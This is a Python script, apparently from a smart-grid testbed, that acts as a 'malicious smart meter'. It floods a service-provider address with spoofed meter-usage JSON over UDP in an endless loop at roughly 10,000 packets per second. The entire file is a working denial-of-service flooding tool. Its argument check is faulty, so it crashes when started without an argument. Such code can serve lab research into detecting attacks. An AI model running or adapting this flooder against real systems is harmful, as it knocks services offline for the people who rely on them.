# attack_client.py
# Malicious Smart Meter (DoS / Flooding)

import socket
import json
import time
import random
import sys

SP_IP = "10.0.3.1"
SP_PORT = 9999

SM_ID = "sm1_attack"

SEND_INTERVAL = 0.0001   
PAYLOAD_SIZE = 120      

def run_attack_client(sm_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[*] ATTACK CLIENT STARTED")
    print(f"[*] Target: {SP_IP}:{SP_PORT}")
    print(f"[*] Rate: {1/SEND_INTERVAL:.0f} pkt/sec")
    print(f"[*] Payload size: {PAYLOAD_SIZE} bytes")
    print("-" * 50)

    while True:
        msg = {
            "smId":sm_id,
            "usage": round(random.uniform(0.5, 5.0), 2),
            "proto": "udp",
            "service": "-",
            "timestamp": time.time()
        }

        sock.sendto(json.dumps(msg).encode(), (SP_IP, SP_PORT))
        time.sleep(SEND_INTERVAL)
if __name__ == "__main__":
    if len(sys.argv) < 1:
        print("Usage: python3 attack_client.py")
        sys.exit(1)
    SM_ID=sys.argv[1]
    run_attack_client(SM_ID)